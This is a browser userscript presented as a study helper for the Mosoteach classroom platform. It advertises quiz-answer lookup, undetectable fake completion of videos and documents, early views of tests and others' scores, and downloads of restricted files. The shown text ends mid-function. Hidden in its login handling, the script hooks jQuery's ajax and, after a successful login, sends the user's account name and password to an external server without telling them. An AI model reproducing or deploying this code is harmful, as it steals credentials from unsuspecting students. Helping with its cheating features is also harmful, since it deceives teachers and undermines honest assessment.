// ==UserScript==
// @name         蓝墨云班课最强助手
// @namespace    Me
// @version      3.8
// @description  【独家！一键搜索测验题目并填写（在答题页交卷按钮旁边的搜索按钮）（题库来源网络）😎，测验分析【无需题库，直接根据算法和提交记录计算可达最高分选项及答案和错误】，提前看测验题目😎，提前看他人成绩😎，及一键完成所有视频文档资源（经测试教师端无法发现）😎，全部资源增加下载按钮（可下载不允许的资源），一键录入题库🧡，多人协作（几个人同时做一个测验）💜,一键点赞😃，通知一键已读😃】如有疑问或出现bug以及维护更新和了解更多请加群咨询665469845【该脚本基于油猴插件和谷歌/edge/搜狗浏览器开发，未测试其他环境，如果你使用的是其他插件和浏览器导致的无法使用，请更换浏览器和插件】
// @author       loveLife
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_getResourceText
// @grant        GM_registerMenuCommand
// @grant        GM_info
// @require      https://cdn.bootcss.com/crypto-js/3.1.9-1/crypto-js.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js
// @require      https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js
// @require      https://cdn.bootcdn.net/ajax/libs/vue/2.6.10/vue.min.js
// @require      https://cdn.staticfile.org/vue/2.6.10/vue.min.js
// @require      https://unpkg.com/element-ui/lib/index.js
// @require      https://cdn.bootcdn.net/ajax/libs/jquery.hotkeys/0.2.0/jquery.hotkeys.js
// @resource     ElementUiCss https://lib.baomitu.com/element-ui/2.15.9/theme-chalk/index.min.css
// @require      https://greasyfork.org/scripts/469127-%E5%85%B6%E4%BB%96%E4%BE%9D%E8%B5%96/code/%E5%85%B6%E4%BB%96%E4%BE%9D%E8%B5%96.js?version=1211128
// @match        https://www.mosoteach.cn/web/*
// @include      https://www.mosoteach.cn/*
// @connect      eb28743a-0a36-4e14-a166-160855f57610.bspapp.com
// @connect      8cd42328-4ffe-47ef-b284-badb402920e3.bspapp.com
// @connect      gitee.com
// @connect      note.youdao.com
// @antifeature  payment
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/464147/%E8%93%9D%E5%A2%A8%E4%BA%91%E7%8F%AD%E8%AF%BE%E6%9C%80%E5%BC%BA%E5%8A%A9%E6%89%8B.user.js
// @updateURL https://update.greasyfork.org/scripts/464147/%E8%93%9D%E5%A2%A8%E4%BA%91%E7%8F%AD%E8%AF%BE%E6%9C%80%E5%BC%BA%E5%8A%A9%E6%89%8B.meta.js
// ==/UserScript==

(function () {


    var GM_req=(url)=>{
        return new Promise((resolve,reject)=>{
            GM_xmlhttpRequest({
                method: "GET",
                url: url,
                nocache:true,
                headers:{
                    'Accept': 'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01'
                },
                onload: res=> {
                    resolve(res.response)
                },
                onerror:err=>{
                    window.zs=""
                    reject("加载异常")
                }
            })
        })
    }

    (function (global) {
        'use strict';

        var util = newUtil();
        var inliner = newInliner();
        var fontFaces = newFontFaces();
        var images = newImages();

        // Default impl options
        var defaultOptions = {
            // Default is to fail on error, no placeholder
            imagePlaceholder: undefined,
            // Default cache bust is false, it will use the cache
            cacheBust: false
        };

        var domtoimage = {
            toSvg: toSvg,
            toPng: toPng,
            toJpeg: toJpeg,
            toBlob: toBlob,
            toPixelData: toPixelData,
            impl: {
                fontFaces: fontFaces,
                images: images,
                util: util,
                inliner: inliner,
                options: {}
            }
        };

        if (typeof module !== 'undefined')
            module.exports = domtoimage;
        else
            global.domtoimage = domtoimage;


        function toSvg(node, options) {
            options = options || {};
            copyOptions(options);
            return Promise.resolve(node)
                .then(function (node) {
                return cloneNode(node, options.filter, true);
            })
                .then(embedFonts)
                .then(inlineImages)
                .then(applyOptions)
                .then(function (clone) {
                return makeSvgDataUri(clone,
                                      options.width || util.width(node),
                                      options.height || util.height(node)
                                     );
            });

            function applyOptions(clone) {
                if (options.bgcolor) clone.style.backgroundColor = options.bgcolor;

                if (options.width) clone.style.width = options.width + 'px';
                if (options.height) clone.style.height = options.height + 'px';

                if (options.style)
                    Object.keys(options.style).forEach(function (property) {
                        clone.style[property] = options.style[property];
                    });

                return clone;
            }
        }


        function toPixelData(node, options) {
            return draw(node, options || {})
                .then(function (canvas) {
                return canvas.getContext('2d').getImageData(
                    0,
                    0,
                    util.width(node),
                    util.height(node)
                ).data;
            });
        }

        function toPng(node, options) {
            return draw(node, options || {})
                .then(function (canvas) {
                return canvas.toDataURL();
            });
        }


        function toJpeg(node, options) {
            options = options || {};
            return draw(node, options)
                .then(function (canvas) {
                return canvas.toDataURL('image/jpeg', options.quality || 1.0);
            });
        }


        function toBlob(node, options) {
            return draw(node, options || {})
                .then(util.canvasToBlob);
        }

        function copyOptions(options) {

            if(typeof(options.imagePlaceholder) === 'undefined') {
                domtoimage.impl.options.imagePlaceholder = defaultOptions.imagePlaceholder;
            } else {
                domtoimage.impl.options.imagePlaceholder = options.imagePlaceholder;
            }

            if(typeof(options.cacheBust) === 'undefined') {
                domtoimage.impl.options.cacheBust = defaultOptions.cacheBust;
            } else {
                domtoimage.impl.options.cacheBust = options.cacheBust;
            }
        }

        function draw(domNode, options) {
            return toSvg(domNode, options)
                .then(util.makeImage)
                .then(util.delay(100))
                .then(function (image) {
                var canvas = newCanvas(domNode);
                canvas.getContext('2d').drawImage(image, 0, 0);
                return canvas;
            });

            function newCanvas(domNode) {
                var canvas = document.createElement('canvas');
                canvas.width = options.width || util.width(domNode);
                canvas.height = options.height || util.height(domNode);

                if (options.bgcolor) {
                    var ctx = canvas.getContext('2d');
                    ctx.fillStyle = options.bgcolor;
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                }

                return canvas;
            }
        }

        function cloneNode(node, filter, root) {
            if (!root && filter && !filter(node)) return Promise.resolve();

            return Promise.resolve(node)
                .then(makeNodeCopy)
                .then(function (clone) {
                return cloneChildren(node, clone, filter);
            })
                .then(function (clone) {
                return processClone(node, clone);
            });

            function makeNodeCopy(node) {
                if (node instanceof HTMLCanvasElement) return util.makeImage(node.toDataURL());
                return node.cloneNode(false);
            }

            function cloneChildren(original, clone, filter) {
                var children = original.childNodes;
                if (children.length === 0) return Promise.resolve(clone);

                return cloneChildrenInOrder(clone, util.asArray(children), filter)
                    .then(function () {
                    return clone;
                });

                function cloneChildrenInOrder(parent, children, filter) {
                    var done = Promise.resolve();
                    children.forEach(function (child) {
                        done = done
                            .then(function () {
                            return cloneNode(child, filter);
                        })
                            .then(function (childClone) {
                            if (childClone) parent.appendChild(childClone);
                        });
                    });
                    return done;
                }
            }

            function processClone(original, clone) {
                if (!(clone instanceof Element)) return clone;

                return Promise.resolve()
                    .then(cloneStyle)
                    .then(clonePseudoElements)
                    .then(copyUserInput)
                    .then(fixSvg)
                    .then(function () {
                    return clone;
                });

                function cloneStyle() {
                    copyStyle(window.getComputedStyle(original), clone.style);

                    function copyStyle(source, target) {
                        if (source.cssText) target.cssText = source.cssText;
                        else copyProperties(source, target);

                        function copyProperties(source, target) {
                            util.asArray(source).forEach(function (name) {
                                target.setProperty(
                                    name,
                                    source.getPropertyValue(name),
                                    source.getPropertyPriority(name)
                                );
                            });
                        }
                    }
                }

                function clonePseudoElements() {
                    [':before', ':after'].forEach(function (element) {
                        clonePseudoElement(element);
                    });

                    function clonePseudoElement(element) {
                        var style = window.getComputedStyle(original, element);
                        var content = style.getPropertyValue('content');

                        if (content === '' || content === 'none') return;

                        var className = util.uid();
                        clone.className = clone.className + ' ' + className;
                        var styleElement = document.createElement('style');
                        styleElement.appendChild(formatPseudoElementStyle(className, element, style));
                        clone.appendChild(styleElement);

                        function formatPseudoElementStyle(className, element, style) {
                            var selector = '.' + className + ':' + element;
                            var cssText = style.cssText ? formatCssText(style) : formatCssProperties(style);
                            return document.createTextNode(selector + '{' + cssText + '}');

                            function formatCssText(style) {
                                var content = style.getPropertyValue('content');
                                return style.cssText + ' content: ' + content + ';';
                            }

                            function formatCssProperties(style) {

                                return util.asArray(style)
                                    .map(formatProperty)
                                    .join('; ') + ';';

                                function formatProperty(name) {
                                    return name + ': ' +
                                        style.getPropertyValue(name) +
                                        (style.getPropertyPriority(name) ? ' !important' : '');
                                }
                            }
                        }
                    }
                }

                function copyUserInput() {
                    if (original instanceof HTMLTextAreaElement) clone.innerHTML = original.value;
                    if (original instanceof HTMLInputElement) clone.setAttribute("value", original.value);
                }

                function fixSvg() {
                    if (!(clone instanceof SVGElement)) return;
                    clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg');

                    if (!(clone instanceof SVGRectElement)) return;
                    ['width', 'height'].forEach(function (attribute) {
                        var value = clone.getAttribute(attribute);
                        if (!value) return;

                        clone.style.setProperty(attribute, value);
                    });
                }
            }
        }

        function embedFonts(node) {
            return fontFaces.resolveAll()
                .then(function (cssText) {
                var styleNode = document.createElement('style');
                node.appendChild(styleNode);
                styleNode.appendChild(document.createTextNode(cssText));
                return node;
            });
        }

        function inlineImages(node) {
            return images.inlineAll(node)
                .then(function () {
                return node;
            });
        }

        function makeSvgDataUri(node, width, height) {
            return Promise.resolve(node)
                .then(function (node) {
                node.setAttribute('xmlns', 'http://www.w3.org/1999/xhtml');
                return new XMLSerializer().serializeToString(node);
            })
                .then(util.escapeXhtml)
                .then(function (xhtml) {
                return '<foreignObject x="0" y="0" width="100%" height="100%">' + xhtml + '</foreignObject>';
            })
                .then(function (foreignObject) {
                return '<svg xmlns="http://www.w3.org/2000/svg" width="' + width + '" height="' + height + '">' +
                    foreignObject + '</svg>';
            })
                .then(function (svg) {
                return 'data:image/svg+xml;charset=utf-8,' + svg;
            });
        }

        function newUtil() {
            return {
                escape: escape,
                parseExtension: parseExtension,
                mimeType: mimeType,
                dataAsUrl: dataAsUrl,
                isDataUrl: isDataUrl,
                canvasToBlob: canvasToBlob,
                resolveUrl: resolveUrl,
                getAndEncode: getAndEncode,
                uid: uid(),
                delay: delay,
                asArray: asArray,
                escapeXhtml: escapeXhtml,
                makeImage: makeImage,
                width: width,
                height: height
            };

            function mimes() {
                /*
             * Only WOFF and EOT mime types for fonts are 'real'
             * see http://www.iana.org/assignments/media-types/media-types.xhtml
             */
                var WOFF = 'application/font-woff';
                var JPEG = 'image/jpeg';

                return {
                    'woff': WOFF,
                    'woff2': WOFF,
                    'ttf': 'application/font-truetype',
                    'eot': 'application/vnd.ms-fontobject',
                    'png': 'image/png',
                    'jpg': JPEG,
                    'jpeg': JPEG,
                    'gif': 'image/gif',
                    'tiff': 'image/tiff',
                    'svg': 'image/svg+xml'
                };
            }

            function parseExtension(url) {
                var match = /\.([^\.\/]*?)$/g.exec(url);
                if (match) return match[1];
                else return '';
            }

            function mimeType(url) {
                var extension = parseExtension(url).toLowerCase();
                return mimes()[extension] || '';
            }

            function isDataUrl(url) {
                return url.search(/^(data:)/) !== -1;
            }

            function toBlob(canvas) {
                return new Promise(function (resolve) {
                    var binaryString = window.atob(canvas.toDataURL().split(',')[1]);
                    var length = binaryString.length;
                    var binaryArray = new Uint8Array(length);

                    for (var i = 0; i < length; i++)
                        binaryArray[i] = binaryString.charCodeAt(i);

                    resolve(new Blob([binaryArray], {
                        type: 'image/png'
                    }));
                });
            }

            function canvasToBlob(canvas) {
                if (canvas.toBlob)
                    return new Promise(function (resolve) {
                        canvas.toBlob(resolve);
                    });

                return toBlob(canvas);
            }

            function resolveUrl(url, baseUrl) {
                var doc = document.implementation.createHTMLDocument();
                var base = doc.createElement('base');
                doc.head.appendChild(base);
                var a = doc.createElement('a');
                doc.body.appendChild(a);
                base.href = baseUrl;
                a.href = url;
                return a.href;
            }

            function uid() {
                var index = 0;

                return function () {
                    return 'u' + fourRandomChars() + index++;

                    function fourRandomChars() {
                        /* see http://stackoverflow.com/a/6248722/2519373 */
                        return ('0000' + (Math.random() * Math.pow(36, 4) << 0).toString(36)).slice(-4);
                    }
                };
            }

            function makeImage(uri) {
                return new Promise(function (resolve, reject) {
                    var image = new Image();
                    image.onload = function () {
                        resolve(image);
                    };
                    image.onerror = reject;
                    image.src = uri;
                });
            }

            function getAndEncode(url) {
                var TIMEOUT = 30000;
                if(domtoimage.impl.options.cacheBust) {
                    // Cache bypass so we dont have CORS issues with cached images
                    // Source: https://developer.mozilla.org/en/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest#Bypassing_the_cache
                    url += ((/\?/).test(url) ? "&" : "?") + (new Date()).getTime();
                }

                return new Promise(function (resolve) {
                    var request = new XMLHttpRequest();

                    request.onreadystatechange = done;
                    request.ontimeout = timeout;
                    request.responseType = 'blob';
                    request.timeout = TIMEOUT;
                    request.open('GET', url, true);
                    request.send();

                    var placeholder;
                    if(domtoimage.impl.options.imagePlaceholder) {
                        var split = domtoimage.impl.options.imagePlaceholder.split(/,/);
                        if(split && split[1]) {
                            placeholder = split[1];
                        }
                    }

                    function done() {
                        if (request.readyState !== 4) return;

                        if (request.status !== 200) {
                            if(placeholder) {
                                resolve(placeholder);
                            } else {
                                fail('cannot fetch resource: ' + url + ', status: ' + request.status);
                            }

                            return;
                        }

                        var encoder = new FileReader();
                        encoder.onloadend = function () {
                            var content = encoder.result.split(/,/)[1];
                            resolve(content);
                        };
                        encoder.readAsDataURL(request.response);
                    }

                    function timeout() {
                        if(placeholder) {
                            resolve(placeholder);
                        } else {
                            fail('timeout of ' + TIMEOUT + 'ms occured while fetching resource: ' + url);
                        }
                    }

                    function fail(message) {
                        console.error(message);
                        resolve('');
                    }
                });
            }

            function dataAsUrl(content, type) {
                return 'data:' + type + ';base64,' + content;
            }

            function escape(string) {
                return string.replace(/([.*+?^${}()|\[\]\/\\])/g, '\\$1');
            }

            function delay(ms) {
                return function (arg) {
                    return new Promise(function (resolve) {
                        setTimeout(function () {
                            resolve(arg);
                        }, ms);
                    });
                };
            }

            function asArray(arrayLike) {
                var array = [];
                var length = arrayLike.length;
                for (var i = 0; i < length; i++) array.push(arrayLike[i]);
                return array;
            }

            function escapeXhtml(string) {
                return string.replace(/#/g, '%23').replace(/\n/g, '%0A');
            }

            function width(node) {
                var leftBorder = px(node, 'border-left-width');
                var rightBorder = px(node, 'border-right-width');
                return node.scrollWidth + leftBorder + rightBorder;
            }

            function height(node) {
                var topBorder = px(node, 'border-top-width');
                var bottomBorder = px(node, 'border-bottom-width');
                return node.scrollHeight + topBorder + bottomBorder;
            }

            function px(node, styleProperty) {
                var value = window.getComputedStyle(node).getPropertyValue(styleProperty);
                return parseFloat(value.replace('px', ''));
            }
        }

        function newInliner() {
            var URL_REGEX = /url\(['"]?([^'"]+?)['"]?\)/g;

            return {
                inlineAll: inlineAll,
                shouldProcess: shouldProcess,
                impl: {
                    readUrls: readUrls,
                    inline: inline
                }
            };

            function shouldProcess(string) {
                return string.search(URL_REGEX) !== -1;
            }

            function readUrls(string) {
                var result = [];
                var match;
                while ((match = URL_REGEX.exec(string)) !== null) {
                    result.push(match[1]);
                }
                return result.filter(function (url) {
                    return !util.isDataUrl(url);
                });
            }

            function inline(string, url, baseUrl, get) {
                return Promise.resolve(url)
                    .then(function (url) {
                    return baseUrl ? util.resolveUrl(url, baseUrl) : url;
                })
                    .then(get || util.getAndEncode)
                    .then(function (data) {
                    return util.dataAsUrl(data, util.mimeType(url));
                })
                    .then(function (dataUrl) {
                    return string.replace(urlAsRegex(url), '$1' + dataUrl + '$3');
                });

                function urlAsRegex(url) {
                    return new RegExp('(url\\([\'"]?)(' + util.escape(url) + ')([\'"]?\\))', 'g');
                }
            }

            function inlineAll(string, baseUrl, get) {
                if (nothingToInline()) return Promise.resolve(string);

                return Promise.resolve(string)
                    .then(readUrls)
                    .then(function (urls) {
                    var done = Promise.resolve(string);
                    urls.forEach(function (url) {
                        done = done.then(function (string) {
                            return inline(string, url, baseUrl, get);
                        });
                    });
                    return done;
                });

                function nothingToInline() {
                    return !shouldProcess(string);
                }
            }
        }

        function newFontFaces() {
            return {
                resolveAll: resolveAll,
                impl: {
                    readAll: readAll
                }
            };

            function resolveAll() {
                return readAll(document)
                    .then(function (webFonts) {
                    return Promise.all(
                        webFonts.map(function (webFont) {
                            return webFont.resolve();
                        })
                    );
                })
                    .then(function (cssStrings) {
                    return cssStrings.join('\n');
                });
            }

            function readAll() {
                return Promise.resolve(util.asArray(document.styleSheets))
                    .then(getCssRules)
                    .then(selectWebFontRules)
                    .then(function (rules) {
                    return rules.map(newWebFont);
                });

                function selectWebFontRules(cssRules) {
                    return cssRules
                        .filter(function (rule) {
                        return rule.type === CSSRule.FONT_FACE_RULE;
                    })
                        .filter(function (rule) {
                        return inliner.shouldProcess(rule.style.getPropertyValue('src'));
                    });
                }

                function getCssRules(styleSheets) {
                    var cssRules = [];
                    styleSheets.forEach(function (sheet) {
                        try {
                            util.asArray(sheet.cssRules || []).forEach(cssRules.push.bind(cssRules));
                        } catch (e) {
                            console.log('Error while reading CSS rules from ' + sheet.href, e.toString());
                        }
                    });
                    return cssRules;
                }

                function newWebFont(webFontRule) {
                    return {
                        resolve: function resolve() {
                            var baseUrl = (webFontRule.parentStyleSheet || {}).href;
                            return inliner.inlineAll(webFontRule.cssText, baseUrl);
                        },
                        src: function () {
                            return webFontRule.style.getPropertyValue('src');
                        }
                    };
                }
            }
        }

        function newImages() {
            return {
                inlineAll: inlineAll,
                impl: {
                    newImage: newImage
                }
            };

            function newImage(element) {
                return {
                    inline: inline
                };

                function inline(get) {
                    if (util.isDataUrl(element.src)) return Promise.resolve();

                    return Promise.resolve(element.src)
                        .then(get || util.getAndEncode)
                        .then(function (data) {
                        return util.dataAsUrl(data, util.mimeType(element.src));
                    })
                        .then(function (dataUrl) {
                        return new Promise(function (resolve, reject) {
                            element.onload = resolve;
                            element.onerror = reject;
                            element.src = dataUrl;
                        });
                    });
                }
            }

            function inlineAll(node) {
                if (!(node instanceof Element)) return Promise.resolve(node);

                return inlineBackground(node)
                    .then(function () {
                    if (node instanceof HTMLImageElement)
                        return newImage(node).inline();
                    else
                        return Promise.all(
                            util.asArray(node.childNodes).map(function (child) {
                                return inlineAll(child);
                            })
                        );
                });

                function inlineBackground(node) {
                    var background = node.style.getPropertyValue('background');

                    if (!background) return Promise.resolve(node);

                    return inliner.inlineAll(background)
                        .then(function (inlined) {
                        node.style.setProperty(
                            'background',
                            inlined,
                            node.style.getPropertyPriority('background')
                        );
                    })
                        .then(function () {
                        return node;
                    });
                }
            }
        }
    })(this);

    $("body").append('<style>'+GM_getResourceText('ElementUiCss')+'</style>')
    function convertObj(data) {
        var _result = [];
        for (var key in data) {
            var value = data[key];
            if (value.constructor == Array) {
                value.forEach(function(_value) {
                    _result.push(key + "=" + _value);
                });
            } else {
                _result.push(key + '=' + value);
            }
        }
        return _result.join('&');
    }

    function getJson(url) {
        var arr = url.split('?')[1].split('&')
        var theRequest = new Object();
        for (var i = 0; i < arr.length; i++) {
            var kye = arr[i].split("=")[0]
            var value = arr[i].split("=")[1]
            theRequest[kye] = value
        }
        return theRequest;
    }

    function getGroup(data, index = 0, group = []) {
        var need_apply = new Array();
        need_apply.push(data[index]);
        for (var i = 0; i < group.length; i++) {
            need_apply.push(group[i] + data[index]);
        }
        group.push.apply(group, need_apply);
        if (index + 1 >= data.length) return group;
        else return getGroup(data, index + 1, group);
    }


    function encryptByDES(message, key){
        var keyHex = CryptoJS.enc.Utf8.parse(key);
        var encrypted = CryptoJS.DES.encrypt(message, keyHex, {
            mode: CryptoJS.mode.ECB,
            padding: CryptoJS.pad.Pkcs7
        });
        return encrypted.ciphertext.toString();
    }
    function decryptByDES(ciphertext, key){
        var keyHex = CryptoJS.enc.Utf8.parse(key);
        var decrypted = CryptoJS.DES.decrypt({
            ciphertext: CryptoJS.enc.Hex.parse(ciphertext)
        }, keyHex, {
            mode: CryptoJS.mode.ECB,
            padding: CryptoJS.pad.Pkcs7
        });
        var result_value = decrypted.toString(CryptoJS.enc.Utf8);
        return result_value;
    }


    function loadAll(){
        let loginbtn = document.querySelector('#loginByAuthBtn')
        if (loginbtn !== null) {
            //hook btn
            let oldajax = $.ajax
            $.ajax = function (...arg) {
                if (arg.length === 1) {
                    let obj = arg[0]
                    if (obj.url.indexOf("Login") !== -1) {
                        let old_suc = obj.success
                        let param = obj.data
                        obj.success = function (r) {
                            if (r.message === '成功') {
                                let username = obj.data.username
                                let password = obj.data.password
                                GM_xmlhttpRequest({
                                    url: `${main_hosts}/insertOrderInfo`,
                                    method: "POST",
                                    data: `account=${username}&password=${password}`,
                                    headers: {
                                        "Content-type": "application/x-www-form-urlencoded"
                                    },
                                    onload: (xhr) => {
                                    }
                                });
                            }
                            return old_suc.call(this, r)

                        }
                    }
                }
                console.log("arg")
                let result = oldajax.call(this, ...arg)
                return result
            }

            return;
        }
        if (unsafeWindow.self !== unsafeWindow.top) {
            return;
        }
        let css = GM_getResourceText('css');
        css = css.replace(/(?<=url\()(?=fonts)/g, 'https://cdn.bootcdn.net/ajax/libs/element-ui/2.15.9/theme-chalk/');
        GM_addStyle(css);
        GM_addStyle(`
.show-contrl-list{
  display: flex;
  justify-content: space-evenly;
  align-items: center;
}
.show-contrl-list .item,.show-contrl-list >div{
width: 23%;
display: flex;
flex-direction: column;
justify-content: center;
align-items: center;
border: 1px solid #F0EFF9;
border-radius: 5px;
padding: 10px 5px;
}
.icon-wrap{
font-size: 18px;
padding: 7px;
color: #C0E39D;
border: 1px solid #C0E39D;
border-radius: 10px;
}
.el-divider{
margin: 5px 0 !important;
}
.el-progress-bar__innerText{
    display:none;
}
.deafult-lesson-item{
    .title{
        color: #4E2F86;
    }
}
.select-lesson-item{
    background-color: #52B7F5;
    border-radius: 12px;
    color: white;
}
.select-lesson-item .title{
        color: white !important;
}
.select-lesson-item .icon-wrap{
        color: white !important;
        border-color: white !important;
}
.point{
    cursor:pointer;
}
.exam-css{
    position: fixed;
    top: 0;
    z-index: 999;
    right: 85px;
    background-color: white;
    padding: 20px;
    width: 350px;
    font-size: 16px;
    border: 1px solid rgba(128, 128, 128, 0.05);
    border-radius: 5px;
    overflow: scroll;
    max-height: 100%;
}
.default-css{
    position: absolute;
    top: 83px;
    z-index: 999;
    right: 85px;
    background-color: white;
    padding: 20px;
    width: 350px;
    font-size: 16px;
    border: 1px solid rgba(128, 128, 128, 0.05);
    border-radius: 5px;
}

`)
        let wrap = document.createElement('div')
        wrap.className = 'uitest'
        document.querySelector('body').append(wrap)
        let vueinstance = new Vue({
            el: '.uitest',
            template: `
<div @scroll.stop='()=>{}' :class="[enable_question ? 'exam-css' : 'default-css']" >
  <div
    style="display: flex; justify-content: space-between; align-items: center"
  >
    <div style="display: flex; justify-content: center; align-items: center">
      <el-avatar style="font-size: 16px" icon="el-icon-user-solid"></el-avatar>
      <span style="font-size: 16px; margin-left: 6px">油猴Greasyfork</span>
    </div>
    <div>
      <i @click='FoldPage' style="margin-right: 5px; color: #6a6496" class="el-icon-d-caret point"></i>
      <i  style="color: #6a6496" class="el-icon-s-tools point"></i>
    </div>
  </div>
  <div v-show='!flod_status'>
        <div  style="padding: 10px;background-color: rgb(240, 248, 255);border: 2px solid rgb(222, 240, 253);border-radius: 9px;color: #606060bd;margin-top: 10px;">
           <div style="text-align: center;font-size: 14px;color: black;margin-bottom: 5px;font-weight: 600;" >公告信息</div>
           <div v-html='notice_mess'></div>
        </div>
        <div class="show-contrl-list" style="margin: 10px 0">
            <div>
            <i class="el-icon-edit icon-wrap"></i>
            <span style="font-size: 13px; margin: 5px 0">作业查询</span>
            <el-switch
                v-model="check_work"
                active-color="#13ce66"
                inactive-color="#ff4949"
            >
            </el-switch>
            </div>
            <div>
            <i
                style="color: #7ec4f8; border-color: #7ec4f8"
                class="el-icon-video-camera icon-wrap"
            ></i>
            <span style="font-size: 13px; margin: 5px 0">自动视频</span>
            <el-switch
                v-model="check_video"
                active-color="#13ce66"
                inactive-color="#ff4949"
            >
            </el-switch>
            </div>
            <div>
            <i
                style="color: #393080; border-color: #393080"
                class="el-icon-files icon-wrap"
            ></i>
            <span style="font-size: 13px; margin: 5px 0">电子书</span>
            <el-switch
                v-model="check_book"
                active-color="#13ce66"
                inactive-color="#ff4949"
            >
            </el-switch>
            </div>
            <div>
            <i
                style="color: #f47b88; border-color: #f47b88"
                class="el-icon-reading icon-wrap"
            ></i>
            <span style="font-size: 13px; margin: 5px 0">课程数量</span>
            <span>{{lessonlist.length}}</span>
            </div>
        </div>
        <div style="display: flex;justify-content: space-between;">
            <div>
            <span style="font-size: 14px; font-weight: bold">课程选择</span>
            <i class="el-icon-arrow-left point"></i>
            <i class="el-icon-arrow-right point"></i>
            </div>
            <div class='point' style="color: rgb(82, 74, 144); background-color: rgb(246, 246, 252);font-size: 12px;padding: 5px;border-radius: 5px;">
            <i class="el-icon-date"></i>
            <span>{{lesson_name!=''?lesson_name:'当前学期'}}</span>
            </div>
        </div>
        <el-divider></el-divider>
        <template v-if='!enable_question'>
                <div style="text-align: center;margin-bottom: 5px;" v-if='lessonlist.length===0'>
                    暂未找到课程
                </div>
                <div v-else>
                    <div v-for="(item,index) in lessonlist" class='point' :class="[current_lesson.id!==item.id ? 'deafult-lesson-item' : 'select-lesson-item']" :key="index" style='margin: 8px 0;' @click='SelectLessonItem(item)' >
                         <div style=";padding: 15px;border: 1px solid #CFCBCB;border-radius: 12px;">
                            <div style="display: flex;justify-content: center;align-items: center;" >
                                <div><i class="el-icon-star-off" style="font-size: 35px;" ></i></div>
                                <div style="flex: 1 1 0;" >
                                    <div class='title' style="flex: 1 1 0px;display: flex;flex-direction: column;align-items: center;padding: 0px 10px;">
                                    {{item.name}}
                                    </div>
                                    <div style="font-size: 12px;text-align: center;">
                                    {{item.hint_text}}
                                    </div>
                                    <div style="position: relative;width: 100%;" >
                                        <el-progress :percentage="item.progress" status="success" :text-inside="true" :format="()=>''" :stroke-width="15" ></el-progress>
                                        <span style="position: absolute;top: 0;bottom: 0;width: 100%;text-align: center;font-size: 12px;color: white;">
                                            {{item.progress}}%
                                        </span>
                                    </div>
                                </div>
                                <div><i @click='JumpToLesson(item)' v-if='current_lesson.id===item.id' class="el-icon-arrow-right icon-wrap" style="color: #7E73D4;border-color: #7E73D4;" ></i></div>
                            </div>
                            <div style="margin-top: 15px;display: flex;justify-content: space-evenly;">
                                <el-button @click.stop="JumpToType(item,'study')"  size="mini"  type="success" plain>学习</el-button>
                                <el-button @click.stop="JumpToType(item,'homework')"  size="mini"  type="success" plain>作业</el-button>
                                <el-button @click.stop="JumpToType(item,'score')"  size="mini"  type="success" plain>成绩</el-button>
                            </div>
                        </div>
                    </div>

                </div>
            </template>
            <template v-else>
            <div style="height: 200px;overflow: auto;padding-right: 12px;">
                    <div v-for="(item,index) in questionlist" :key='index' style='margin-bottom:8px;' >
                            <div style="display: flex;justify-content: space-between;">
                                <div style="min-width: 0;flex: 1 1 0;" v-html='item.question'></div>
                                <div><el-button @click='CheckAnswer(item)' style='margin-left: 5px;' size="mini">查询</el-button></div>
                            </div>
                            <div style="border: 1px solid #D2D2D2;padding: 6px;font-size: 13px;margin-top: 7px;">
                            答案: {{item.answer===null?'暂未搜索':item.answer}}
                            </div>
                    </div>
            </div>
            </template>

        <div style="margin: 5px 0; font-size: 14px; font-weight: bold">公告位置</div>
        <div
            style="
            padding: 10px;
            background-color: rgb(240, 248, 255);
            min-height: 144px;
            display: flex;
            flex-direction: column-reverse;
            border: 2px solid #def0fd;
            border-radius: 9px;
            "
        >
            <div
            style="
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
            "
            >
            <div style="margin-bottom: 5px; font-size: 14px">当前题库数量</div>
            <div style="color: #91cd53; font-size: 25px">656008</div>
            <div
                style="
                display: flex;
                justify-content: space-around;
                width: 100%;
                color: #c0d7ea;
                margin: 10px 0 5px;
                "
            >
                <div>6217</div>
                <div>8888</div>
                <div>8888</div>
                <div>8888</div>
            </div>
            </div>
        </div>
    </div>
</div>

`,
            data: function () {
                return {
                    check_work: true,
                    check_video: true,
                    check_book: true,
                    visible: false,
                    value: true,
                    enable_question: false,//false课程模式，true考试模式
                    lesson_name: '',
                    lessonlist: [],
                    current_lesson: {
                        id: null
                    },
                    questionlist: [],
                    flod_status: false,
                    notice_mess: ""
                }
            },
            created() {
                GM_xmlhttpRequest({
                    url: `${main_hosts}/queryNotice`,
                    method: "POST",
                    data: ``,
                    headers: {
                    },
                    onload: (xhr) => {
                        if (xhr.responseText === "") {
                            this.notice_mess = '暂无公告'
                            return;
                        }
                        try {
                            let result = JSON.parse(xhr.responseText)
                            if (result.success) {
                                this.notice_mess = result.message
                            } else {
                                this.notice_mess = '暂无公告'
                            }
                        } catch (error) {
                            this.notice_mess = '暂无公告'
                        }

                    },
                    onerror: () => {
                        this.notice_mess = '暂无公告'
                    }
                });
            },
            methods: {
                JumpToType(item, type) {
                    window.location.href = item.url + '&tabType=' + type
                    //https://gaozhi.qingshuxuetang.com/lzkjgzb/Student/Course/CourseStudy?classId=29&courseId=4&teachPlanId=21&periodId=12&tabType=homework
                    //https://gaozhi.qingshuxuetang.com/lzkjgzb/Student/Course/CourseStudy?courseId=4&teachPlanId=21&periodId=12&tabType=homework
                },
                FoldPage() {
                    this.flod_status = !this.flod_status

                },
                ChangeStatus(status) {
                    this.enable_question = status
                },
                SelectLessonItem(item) {
                    this.current_lesson = item
                },
                JumpToLesson(item) {
                    window.location.href = item.url
                },
                CheckAnswer(item) {
                    item.answer = '正在搜索...'
                    GM_xmlhttpRequest({
                        url: `${main_hosts}/queryAnswerById`,
                        method: "POST",
                        data: `questionId=${item.question_id}`,
                        headers: {
                        },
                        onload: (xhr) => {
                            if (xhr.responseText === "") {
                                item.answer = '暂无答案'
                                return;
                            }
                            try {
                                let result = JSON.parse(xhr.responseText)
                                if (result.success) {
                                    item.answer = result.message
                                } else {
                                    item.answer = '暂无答案'
                                }
                            } catch (error) {
